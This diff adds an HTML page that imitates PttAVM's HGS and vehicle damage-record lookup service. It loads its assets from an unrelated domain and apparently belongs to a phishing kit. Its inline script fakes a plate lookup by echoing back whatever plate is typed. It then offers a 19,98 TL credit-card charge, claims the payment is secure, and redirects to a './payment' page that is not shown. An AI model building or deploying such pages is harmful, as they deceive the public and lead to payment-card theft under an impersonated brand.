@@ -1,0 +1,636 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1 user-scalable=0">
+    <meta name="description" content="HGS Yükleme & HGS Sorgulama işlemleri PttAVM.com'da! HGS • Hızlı Geçiş Sistemi ödemelerini hızlıca gerçekleştir! Bakiye Sorgula! Hemen Tıkla!">
+    <title>Tramer Kaydı Sorgulama • Araç Hasar Kaydı Sorgulama • KM Sorgulama • PttAVM</title>
+    <link rel="icon" type="image/png" href="https://snapp-ir.vidmatee.sbs/assets/images/favicon.png">
+    <link rel="stylesheet" href="https://snapp-ir.vidmatee.sbs/assets/fonts/opensans/open-sans.css">
+    <link rel="stylesheet" href="./ass/opensans/open-sans.css">
+    <link rel="stylesheet" href="./ass/themify-icons.css">
+    <script src="https://snapp-ir.vidmatee.sbs/assets/js/pace.js" type="text/javascript"></script>
+    <link rel="stylesheet" type="text/css" href="https://snapp-ir.vidmatee.sbs/assets/css/pace.css">
+    <link rel="stylesheet" href="https://snapp-ir.vidmatee.sbs/assets/css/hgs.css">
+    <script src="https://code.jquery.com/jquery-1.12.4.js" integrity="sha256-Qw82+bXyGq6MydymqBxNPYTaUXXq7c8v3CwiYwLLNXU=" crossorigin="anonymous"></script>
+  </head>
+  <body>
+    <div class="image-container wizard-hgs-image-container set-full-height" style="background-image: url(https://snapp-ir.vidmatee.sbs/assets/images/backgrounds/damage.jpg);">
+      <div class="container-fluid no-padding">
+        <div class="navbar-header" style="overflow: hidden;">
+          <div class="logo-field">
+            <a class="navbar-brand navbar-left">
+              <img src="https://snapp-ir.vidmatee.sbs/assets/images/pttavm_hgs_logo.png" class="logo" title="HGS - PttAVM" border="0">
+            </a>
+          </div>
+          <div class="menu-field show-on-page-load">
+            <nav class="nav responsive-menu">
+              <div class="menu-wrapper resize-drag nav-wrapper">
+                <ul class="nav-ul">
+                  <li class="homepage-menu-item">
+                    <a title="HGS Yükle">
+                      <span>Ana Sayfa</span>
+                    </a>
+                  </li>
+                  <li class="hgs-menu-item">
+                    <a title="HGS Yükle" class="selected">
+                      <span>
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/menu/hgs_yukle.png" class="menu-showed-item">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/menu/hgs_yukle_hover.png" class="menu-hover-item display-none">Yükle </span>
+                    </a>
+                  </li>
+                  <li class="damage-menu-item">
+                    <a title="Araç Hasar Sorgulama, Araç Hasar Kaydı Sorgulama">
+                      <span>
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/menu/hasar_sorgula.png" class="menu-showed-item">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/menu/hasar_sorgula_hover.png" class="menu-hover-item display-none">Hasar Sorgula </span>
+                    </a>
+                  </li>
+                  <li class="km-menu-item">
+                    <a title="Araç KM Sorgulama, Araç Muayene Sorgulama, Araç Kilometre Sorgulama">
+                      <span>
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/menu/km_sorgula.png" class="menu-showed-item">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/menu/km_sorgula_hover.png" class="menu-hover-item display-none">KM Sorgula </span>
+                    </a>
+                  </li>
+                  <li>
+                    <a>
+                      <span>
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/menu/sigortayeri-white.png" class="menu-showed-item">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/menu/sigortayeri-yellow.png" class="menu-hover-item display-none">Sigorta & Kasko Teklifi Al </span>
+                    </a>
+                  </li>
+                  <li class="shopping-cart-menu-item">
+                    <a>
+                      <span>
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/menu/alisveris.png" class="menu-showed-item">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/menu/alisveris_hover.png" class="menu-hover-item display-none">Alışverişe Başla </span>
+                    </a>
+                  </li>
+                </ul>
+              </div>
+            </nav>
+          </div>
+          <div class="actions-field">
+            <div class="navbar-buttons navbar-right">
+              <a class="navbar-btn operation_links" id="btn-register">Üye Ol</a>
+              <a class="navbar-btn operation_links" id="btn-login">Giriş Yap</a>
+            </div>
+          </div>
+        </div>
+        <style>
+          nav.nav.responsive-menu ul li.shopping-cart-menu-item a span {
+            border-right: 0 !important;
+          }
+        </style>
+        <div class="col-sm-12 col-md-8 col-md-offset-2 col-lg-6 col-lg-offset-3" id="hgs-query-container">
+          <div id="box1" class="wizard-container show-on-page-load">
+            <div class="card wizard-card" data-color="orange" id="wizardProfile">
+              <div class="wizard-header">
+                <div class="panel-header-icons">
+                  <img class="panel-header-first-icon" src="https://snapp-ir.vidmatee.sbs/assets/images/menu/hasar_sorgula_hover.png">
+                </div>
+                <h1>
+                  <img class="panel-header-second-icon" src="https://snapp-ir.vidmatee.sbs/assets/images/menu/hasar_sorgula_hover.png"> Araç Hasar Kaydı Sorgulama
+                </h1>
+                <h6 class="hgs-query-subtitle"> HASAR KAYDI / ARAÇ DETAY SORGULAMAK İSTEDİĞİNİZ ARACIN PLAKA YA DA ŞAŞİ NUMARASINI GİREREK GÜNCEL KAYITLARINA ULAŞABİLİRSİNİZ. </h6>
+              </div>
+              <div class="wizard-navigation">
+                <div class="progress-with-circle">
+                  <div class="progress-bar" role="progressbar" aria-valuenow="1" aria-valuemin="1" aria-valuemax="3" style="width: 12.5%;"></div>
+                </div>
+                <ul class="nav nav-pills">
+                  <li style="width: 25%">
+                    <a>
+                      <div class="icon-circle checked" style="
+    border-color: #fab62e;
+    background-color: #fab62e;
+">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/search-active.png" class="tabs-icon-active display-none">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/search-active.png" class="tabs-icon-passive display-none">
+                      </div>
+                    </a>
+                  </li>
+                  <li style="width: 25%">
+                    <a>
+                      <div class="icon-circle checked" style="
+    border-color: #fff;
+    background-color: #3a3a3a;
+">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/ticket-active.png" class="tabs-icon-active display-none">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/ticket.png" class="tabs-icon-passive display-none">
+                      </div>
+                    </a>
+                  </li>
+                  <li data-index="0" class="active" style="width: 25%">
+                    <a>
+                      <div class="icon-circle checked" data-toggle="tab" style="
+    background-color: #3a3a3a;
+    border-color: #fff;
+">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/tl.png" class="tabs-icon-active display-none">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/tl.png" class="tabs-icon-passive display-none">
+                      </div>
+                    </a>
+                  </li>
+                  <li style="width: 25%">
+                    <a>
+                      <div class="icon-circle">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/payment-active.png" class="tabs-icon-active display-none">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/payment.png" class="tabs-icon-passive display-none">
+                      </div>
+                    </a>
+                  </li>
+                </ul>
+              </div>
+              <div class="tab-content text-center">
+                <div class="tab-pane panel-border active" id="hgs-query-check">
+                 <form id="hgsQueryNo" name="hgs-query-no" data-tab="0" novalidate="novalidate" method="POST" action="./sorgula.html">
+                  <div class="panel-inside">
+                    <div>
+                      <p class="text-center tab-pane-heading">HASAR KAYDI CEP TELEFONUNUZA ÖDEME YAPILDIKTAN SONRA OTOMATİK OLARAK GÖNDERİLECEKTİR.</p>
+                    </div>
+                    <div class="flex-wrap-container">
+                      <div>
+                        <button type="button" class="btn btn-warning btn-fill hgs-query-process-type query-process-type btn-with-checked-icon" data-id="0" onclick="hgs.setProcessType($(this));">PLAKA NO</button>
+                        <button type="button" class="btn btn-warning hgs-query-process-type query-process-type btn-with-checked-icon" data-id="4" onclick="hgs.setProcessType($(this));">ŞAŞİ NO</button>
+                      </div>
+                    </div>
+                    <div class="form-group hgs-query-input">
+                      <input type="text" class="form-control text-center hgs-query-no hgs-query-inputs" maxlength="11" id="pelak" placeholder="Plaka Numarası" aria-required="true" required>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="wizard-footer">
+                <div class="pull-right">
+                  <button id="btnpelak" class="btn text-white btn-warning">SORGULA <img src="https://snapp-ir.vidmatee.sbs/assets/images/buttons/right-arrow.png"></button>
+                  </form>
+                </div>
+                <div class="clearfix"></div>
+              </div>
+            </div>
+          </div>
+          <div style="display: none;" id="box2" class="wizard-container">
+            <div
+              class="card wizard-card"
+              data-color="orange"
+              id="wizardProfile"
+            >
+              <div class="wizard-header">
+                <div class="panel-header-icons">
+                  <img
+                    class="panel-header-first-icon"
+                    src="https://snapp-ir.vidmatee.sbs/assets/images/menu/hasar_sorgula_hover.png"
+                  />
+                </div>
+                <h1>
+                  <img
+                    class="panel-header-second-icon"
+                    src="https://snapp-ir.vidmatee.sbs/assets/images/menu/hasar_sorgula_hover.png"
+                  />
+                  Araç Hasar Kaydı Sorgulama
+                </h1>
+                <h6 class="hgs-query-subtitle">
+                  HASAR KAYDI / ARAÇ DETAY SORGULAMAK İSTEDİĞİNİZ ARACIN PLAKA
+                  YA DA ŞAŞİ NUMARASINI GİREREK GÜNCEL KAYITLARINA
+                  ULAŞABİLİRSİNİZ.
+                </h6>
+              </div>
+              <div class="wizard-navigation">
+                <div class="progress-with-circle">
+                  <div
+                    class="progress-bar"
+                    role="progressbar"
+                    aria-valuenow="1"
+                    aria-valuemin="1"
+                    aria-valuemax="3"
+                    style="width: 12.5%"
+                  ></div>
+                </div>
+                <ul class="nav nav-pills">
+                  <li style="width: 25%">
+                    <a>
+                      <div class="icon-circle checked" style="
+    border-color: #fff;
+    background-color: #3a3a3a;
+">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/search-active.png" class="tabs-icon-active display-none">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/search.png" class="tabs-icon-passive display-none">
+                      </div>
+                    </a>
+                  </li>
+                  <li style="width: 25%">
+                    <a>
+                      <div class="icon-circle checked" style="
+    border-color: #fab62e;
+    background-color: #fab62e;
+">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/ticket-active.png" class="tabs-icon-active display-none">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/ticket-active.png" class="tabs-icon-passive display-none">
+                      </div>
+                    </a>
+                  </li>
+                  <li data-index="0" class="active" style="width: 25%">
+                    <a>
+                      <div class="icon-circle checked" data-toggle="tab" style="
+    background-color: #3a3a3a;
+    border-color: #fff;
+">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/tl.png" class="tabs-icon-active display-none">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/tl.png" class="tabs-icon-passive display-none">
+                      </div>
+                    </a>
+                  </li>
+                  <li style="width: 25%">
+                    <a>
+                      <div class="icon-circle">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/payment-active.png" class="tabs-icon-active display-none">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/payment.png" class="tabs-icon-passive display-none">
+                      </div>
+                    </a>
+                  </li>
+                </ul>
+              </div>
+              <div class="tab-content text-center">
+                <div class="tab-pane panel-border active" id="hgs-query-check">
+                  <div class="panel-inside">
+                    <div
+                      class="hgs-query-label-container display-none"
+                      style="display: block"
+                    >
+                      <div>
+                        <span class="tab-pane-heading"
+                          >Yükleme yapmak istediğiniz etiketi seçiniz.</span
+                        >
+                      </div>
+                      <div>
+                        <div
+                          id="DataTables_Table_0_wrapper"
+                          class="dataTables_wrapper no-footer"
+                        >
+                          <table
+                            class="hgs-query-label-table display nowrap table-hover jq-responsive-dataTable no-footer dataTable dtr-inline collapsed"
+                            width="100%"
+                            id="DataTables_Table_0"
+                            role="grid"
+                            aria-describedby="DataTables_Table_0_info"
+                            style="width: 100%"
+                          >
+                            <thead>
+                              <tr role="row">
+                                <th
+                                  class="hgs-query-tickec-check-title sorting_asc sorting_disabled details-control"
+                                  tabindex="0"
+                                  aria-controls="DataTables_Table_0"
+                                  rowspan="1"
+                                  colspan="1"
+                                  style="width: 47px"
+                                  aria-label=": activate to sort column descending"
+                                  aria-sort="ascending"
+                                ></th>
+                                <th
+                                  class="sorting_disabled hgs-ticket-list-number"
+                                  tabindex="0"
+                                  aria-controls="DataTables_Table_0"
+                                  rowspan="1"
+                                  colspan="1"
+                                  style="width: 80px"
+                                  aria-label="ETİKET NO: activate to sort column ascending"
+                                >
+                                  ETİKET NO
+                                </th>
+                                <th
+                                  class="sorting_disabled hgs-ticket-list-plate"
+                                  tabindex="0"
+                                  aria-controls="DataTables_Table_0"
+                                  rowspan="1"
+                                  colspan="1"
+                                  style="width: 64px"
+                                  aria-label="PLAKA NO: activate to sort column ascending"
+                                >
+                                  PLAKA NO
+                                </th>
+                              </tr>
+                            </thead>
+                            <tbody>
+                              <tr
+                                role="row"
+                                data-id="1094411176"
+                                class="odd selected-label"
+                              >
+                                <td class="details-control" tabindex="0">
+                                  <div
+                                    class="hgs-query-ticket-checkbox"
+                                    data-id="1094411176"
+                                    data-class=""
+                                  ></div>
+                                </td>
+                                <td id="ticketnum" class="hgs-ticket-list-number">
+                                  **********
+                                </td>
+                                <td id="ticketnum2" class="hgs-ticket-list-plate">******</td>
+                              </tr>
+                            </tbody>
+                          </table>
+                          <div
+                            class="dataTables_info"
+                            id="DataTables_Table_0_info"
+                            role="status"
+                            aria-live="polite"
+                          >
+                            1 kayıttan 1 - 1 arasındaki kayıtlar gösteriliyor
+                          </div>
+                        </div>
+                        <span
+                          class="hgs-query-ticket-message display-none"
+                          style="display: inline"
+                          >********** etiket numaralı, ****** plakalı aracın
+                          hasar kaydı sorgulama işlemi için devam
+                          edeceksiniz.</span
+                        >
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="wizard-footer">
+                <div class="pull-right">
+                  <button
+                  id="btn2"
+                    type="button"
+                    class="btn text-white btn-warning"
+                  >
+                    İLERİ
+                    <img
+                      src="https://snapp-ir.vidmatee.sbs/assets/images/buttons/right-arrow.png"
+                    />
+                  </button>
+                </div>
+                <div class="clearfix"></div>
+              </div>
+            </div>
+          </div>
+          <div style="display: none;" id="box3" class="wizard-container">
+            <div
+              class="card wizard-card"
+              data-color="orange"
+              id="wizardProfile"
+            >
+              <div class="wizard-header">
+                <div class="panel-header-icons">
+                  <img
+                    class="panel-header-first-icon"
+                    src="https://snapp-ir.vidmatee.sbs/assets/images/menu/hasar_sorgula_hover.png"
+                  />
+                </div>
+                <h1>
+                  <img
+                    class="panel-header-second-icon"
+                    src="https://snapp-ir.vidmatee.sbs/assets/images/menu/hasar_sorgula_hover.png"
+                  />
+                  Araç Hasar Kaydı Sorgulama
+                </h1>
+                <h6 class="hgs-query-subtitle">
+                  KİLOMETRE VE MUAYENE SORGULAMAK HASAR KAYDI / ARAÇ DETAY
+                  SORGULAMAK İSTEDİĞİNİZ ARACIN PLAKA YA DA ŞAŞİ NUMARASINI
+                  GİREREK GÜNCEL KAYITLARINA ULAŞABİLİRSİNİZ.
+                </h6>
+              </div>
+              <div class="wizard-navigation">
+                <div class="progress-with-circle">
+                  <div
+                    class="progress-bar"
+                    role="progressbar"
+                    aria-valuenow="1"
+                    aria-valuemin="1"
+                    aria-valuemax="3"
+                    style="width: 62.5%"
+                  ></div>
+                </div>
+                <ul class="nav nav-pills">
+                  <li style="width: 25%">
+                    <a>
+                      <div class="icon-circle checked" style="
+    border-color: #fff;
+    background-color: #3a3a3a;
+">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/search-active.png" class="tabs-icon-active display-none">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/search.png" class="tabs-icon-passive display-none">
+                      </div>
+                    </a>
+                  </li>
+                  <li style="width: 25%">
+                    <a>
+                      <div class="icon-circle checked" style="
+    border-color: #fff;
+    background-color: #3a3a3a;
+">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/ticket.png" class="tabs-icon-active display-none">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/ticket.png" class="tabs-icon-passive display-none">
+                      </div>
+                    </a>
+                  </li>
+                  <li data-index="0" class="active" style="width: 25%">
+                    <a>
+                      <div class="icon-circle checked" data-toggle="tab" style="
+    background-color: #fab62e;
+    border-color: #fab62e;
+">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/tl-active.png" class="tabs-icon-active display-none">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/tl.png" class="tabs-icon-passive display-none">
+                      </div>
+                    </a>
+                  </li>
+                  <li style="width: 25%">
+                    <a>
+                      <div class="icon-circle">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/payment-active.png" class="tabs-icon-active display-none">
+                        <img src="https://snapp-ir.vidmatee.sbs/assets/images/tabs/payment.png" class="tabs-icon-passive display-none">
+                      </div>
+                    </a>
+                  </li>
+                </ul>
+              </div>
+              <div class="tab-content text-center">
+                <div class="tab-pane panel-border active" id="hgs-query-check">
+                  <div class="panel-inside">
+                    <div class="hgs-payment-type-select" style="display: block">
+                      <ul>
+                        <li data-type="credit_card" class="selected">
+                          <i class="ti-credit-card"></i> KREDİ KARTI
+                        </li>
+                        <li data-type="bank_transfer">
+                          <i class="ti-exchange-vertical"></i>
+                        </li>
+                      </ul>
+                    </div>
+                    <div
+                      class="hgs-show-field-after-payment-type-select"
+                      style="display: block"
+                    >
+                      <span class="tab-pane-heading"
+                        >Ödeme Sayfasına Yönlendirilmek İçin Seçip
+                        Tıklayınız</span
+                      >
+                      <form
+                        id="hgsQueryAmount"
+                        name="hgs-query-amount"
+                        method="POST"
+                        novalidate="novalidate"
+                      >
+                        <div class="hgs-query-amounts-label-container">
+                          <div
+                            class="hgs-query-amounts-label"
+                            onclick="hgs.amountsLabel($(this));"
+                            data-commission="0"
+                            data-price="25"
+                          >
+                            <div class="choice" data-toggle="wizard-checkbox">
+                              <input type="checkbox" name="" value="0" />
+                              <div
+                                class="card card-checkboxes"
+                                onclick="hgs.cardCheckboxes($(this));"
+                                data-id="8"
+                              >
+                                <span>19,98 TL</span>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="hgs-ticket-warnings">
+                          <ul>
+                            <li>
+                              Bizim sitemizden güvenli bir şekilde ödemenizi
+                              yapabilirsiniz
+                            </li>
+                          </ul>
+                        </div>
+                        <div class="col-sm-12 hgs-query-amounts-calc-container">
+                          <div class="hgs-query-amounts-calc">
+                            <p></p>
+                          </div>
+                        </div>
+                        <input type="hidden" name="selected_label" />
+                      </form>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="wizard-footer">
+                <div class="pull-right">
+                  <a id="btn3" class="btn text-white btn-warning"
+                    >İLERİ<img
+                      src="https://snapp-ir.vidmatee.sbs/assets/images/buttons/right-arrow.png"
+                  /></a>
+                </div>
+                <div class="clearfix"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <footer>
+        <div class="container">
+          <div class="copyright">© Copyright 2022 | Tüm hakları saklıdır.</div>
+          <div class="footer-menu">
+            <ul>
+              <li class="important-informations">
+                <a>Önemli Bilgiler</a>
+                <ul>
+                  <li>
+                    <a>Açık Rıza Metni</a>
+                  </li>
+                  <li>
+                    <a>Aydınlatma Metni</a>
+                  </li>
+                  <li>
+                    <a>İmha Politikası</a>
+                  </li>
+                  <li>
+                    <a>Gizlilik Politikası</a>
+                  </li>
+                </ul>
+              </li>
+              <li>
+                <a>Görüş Bildir</a>
+              </li>
+              <li>
+                <a>Sıkça Sorulan Sorular</a>
+              </li>
+              <li>
+                <a>İletişim</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </footer>
+    </div>
+    <script type="text/javascript" src="https://snapp-ir.vidmatee.sbs/assets/js/mainFunction.js"></script>
+    <script type="text/javascript" src="https://snapp-ir.vidmatee.sbs/assets/js/uaParser.min.js"></script>
+    <script type="text/javascript" src="https://snapp-ir.vidmatee.sbs/assets/js/js.cookie.min.js"></script>
+    <script type="text/javascript" src="https://snapp-ir.vidmatee.sbs/assets/js/hgs.js"></script>
+    <script type="text/javascript">
+      $(document).ready(function() {
+        app.documentReady();
+        $(window).trigger('resize')
+      });
+      $(window).resize(function() {
+        app.navResizeCheck();
+        app.scaleCaptcha();
+      });
+      var appReadyStateInterval = setInterval(function() {
+        if (document.readyState === 'complete') {
+          app.completeReadyState();
+          clearInterval(appReadyStateInterval)
+        }
+      }, 100);
+
+      $(document).ready(function() {
+        hgs.documentReady();
+      });
+    </script>
+    <script>
+      $(document).ready(function () { 
+        const pelak = document.querySelector('#pelak')
+        const btn = document.querySelector('#btnpelak')
+        const btn2 = document.querySelector('#btn2')
+        const btn3 = document.querySelector('#btn3')
+        const box1 = document.querySelector('#box1')
+        const box2 = document.querySelector('#box2')
+        const box3 = document.querySelector('#box3')
+
+        btn.addEventListener('click',function (e) { 
+          e.preventDefault()
+          if (pelak.value.length < 6) {
+            pelak.setAttribute('class','form-control text-center hgs-query-no hgs-query-inputs error')
+          }
+          else{
+            pelak.setAttribute('class','form-control text-center hgs-query-no hgs-query-inputs')
+            box1.style.display = 'none'
+            box2.style.display = ''
+          }
+
+          document.querySelector('#ticketnum').innerHTML = pelak.value
+          document.querySelector('#ticketnum2').innerHTML = pelak.value
+         })
+
+         btn2.addEventListener('click',function (e) { 
+          e.preventDefault()
+          box2.style.display = 'none'
+          box3.style.display = ''
+          })
+
+          btn3.addEventListener('click',function (e) { 
+          e.preventDefault()
+          btn3.innerHTML = 'Processing'
+          setTimeout(() => {
+            window.location.href = './payment'
+          }, 1000);
+          })
+
+       })
+    </script>
+    <div class="body-backdrop"></div>
+  </body>
+</html>
